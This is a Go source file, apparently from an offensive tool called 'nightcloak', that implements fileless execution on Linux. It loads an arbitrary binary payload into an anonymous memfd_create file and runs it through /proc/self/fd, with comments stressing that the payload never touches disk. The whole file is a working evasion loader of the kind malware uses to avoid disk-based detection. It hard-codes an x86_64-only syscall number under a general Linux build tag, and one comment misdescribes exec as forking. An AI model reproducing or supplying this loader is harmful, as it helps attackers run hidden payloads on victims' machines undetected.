//go:build linux
// +build linux

package native

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// MemExec executes a binary payload directly from memory using memfd_create.
// The binary never touches the physical disk.
func MemExec(payload []byte, args []string) error {
	// 1. Create an anonymous file in RAM.
	// 319 is the syscall number for memfd_create on x86_64.
	// We use name "nightcloak_mem" for the descriptor.
	fd, _, err := syscall.Syscall(319, uintptr(unsafe.Pointer(syscall.StringBytePtr("nightcloak_mem"))), uintptr(1), 0)
	if err != 0 {
		return fmt.Errorf("memfd_create failed: %w", err)
	}

	// 2. Write the payload to the memory file descriptor.
	f := os.NewFile(fd, "memfd")
	defer f.Close()
	if _, err := f.Write(payload); err != nil {
		return fmt.Errorf("writing payload to memfd: %w", err)
	}

	// 3. Prepare arguments for execve.
	// The first argument (argv[0]) should be the name of the executable.
	execArgs := append([]string{"nightcloak_exec"}, args...)

	// 4. Call execve using the file descriptor path in /proc/self/fd/.
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	
	// syscall.Exec handles the fork/exec logic.
	if err := syscall.Exec(fdPath, execArgs, os.Environ()); err != nil {
		return fmt.Errorf("execve failed: %w", err)
	}

	return nil
}
